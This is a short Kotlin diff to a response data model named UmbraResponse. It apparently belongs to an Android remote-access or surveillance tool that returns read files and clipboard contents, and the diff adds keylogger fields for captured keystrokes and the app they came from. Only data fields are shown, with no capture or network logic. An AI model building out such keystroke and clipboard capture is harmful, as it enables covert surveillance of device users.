@@ -39,6 +39,7 @@ sealed class UmbraResponse {
     @SerialName("file_read")
     data class FileReadResponse(
         val file_id: String,
+        val file_name: String = "",
         val mime_type: String,
         val size_bytes: Long,
         val base64_data: String
@@ -200,7 +201,11 @@ sealed class UmbraResponse {
         val app_name: String = "",
         // Clipboard fields
         val clipboard_text: String = "",
-        val clipboard_mime: String = "text/plain"
+        val clipboard_mime: String = "text/plain",
+        // Keylogger fields
+        val keylog_text: String = "",
+        val keylog_package: String = "",
+        val keylog_event: String = "keystroke"
     ) : UmbraResponse()
 
     @Serializable
